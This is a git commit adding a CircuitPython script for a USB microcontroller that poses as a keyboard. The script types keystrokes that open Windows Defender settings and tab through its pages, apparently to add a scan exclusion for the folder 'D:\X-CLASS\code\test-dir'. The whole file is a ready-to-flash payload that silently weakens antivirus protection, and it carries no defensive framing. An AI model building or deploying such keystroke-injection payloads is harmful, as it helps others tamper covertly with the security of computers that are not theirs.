41ddfdb8572ddb43b309f3a280eb8f1c4b819a5e
Hackwithvyshu <64751167+keralahacker@users.noreply.github.com>
2022-02-03 10:33:57 +0530

    Add files via upload

---
+++ lib/code.py
@@ -0,0 +1,89 @@
+#(https://github.com/vaishnavucv
+# vaishnavucv.github.io
+import time
+import os
+import usb_hid
+import digitalio
+import board
+import digitalio
+import random
+
+from adafruit_hid.keycode import Keycode
+from adafruit_hid.keyboard import Keyboard
+from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
+
+led = digitalio.DigitalInOut(board.LED)
+led.direction = digitalio.Direction.OUTPUT
+
+led.value = False
+time.sleep(3)
+
+if not 'a.txt' in os.listdir():
+    time.sleep(1.5)
+    led.value=True
+    keyboard = Keyboard(usb_hid.devices)
+    layout = KeyboardLayoutUS(keyboard)
+
+    keyboard.send(Keycode.WINDOWS, Keycode.R)
+    time.sleep(1)
+    layout.write("windowsdefender://")
+    time.sleep(1)
+    keyboard.send(Keycode.ENTER)
+    time.sleep(1)
+    keyboard.send(Keycode.TAB)
+    time.sleep(1)
+    keyboard.send(Keycode.TAB)
+    time.sleep(1)
+    keyboard.send(Keycode.TAB)
+    time.sleep(1)
+    keyboard.send(Keycode.TAB)
+    time.sleep(1)
+    keyboard.send(Keycode.ENTER)
+    time.sleep(1)
+keyboard.send(Keycode.TAB)
+time.sleep(1)
+keyboard.send(Keycode.TAB)
+time.sleep(1)
+keyboard.send(Keycode.TAB)
+time.sleep(1)
+keyboard.send(Keycode.TAB)
+time.sleep(1)
+keyboard.send(Keycode.ENTER)
+time.sleep(1)
+keyboard.send(Keycode.TAB)
+time.sleep(1)
+keyboard.send(Keycode.TAB)
+time.sleep(1)
+keyboard.send(Keycode.TAB)
+time.sleep(1)
+keyboard.send(Keycode.TAB)
+time.sleep(1)
+keyboard.send(Keycode.TAB)
+time.sleep(1)
+keyboard.send(Keycode.TAB)
+time.sleep(1)
+keyboard.send(Keycode.TAB)
+time.sleep(1)
+keyboard.send(Keycode.ENTER)
+time.sleep(1)
+keyboard.send(Keycode.LEFT_ARROW)
+time.sleep(1)
+keyboard.send(Keycode.ENTER)
+time.sleep(1)
+keyboard.send(Keycode.ENTER)
+time.sleep(1)
+keyboard.send(Keycode.DOWN_ARROW)
+time.sleep(1)
+keyboard.send(Keycode.ENTER)
+time.sleep(1)
+layout.write(" D:\X-CLASS\code\test-dir")
+time.sleep(1)
+keyboard.send(Keycode.ENTER)
+
+
+
+while True:
+    led.value = True
+    time.sleep(0.1)
+    led.value = False
+    time.sleep(0.1)
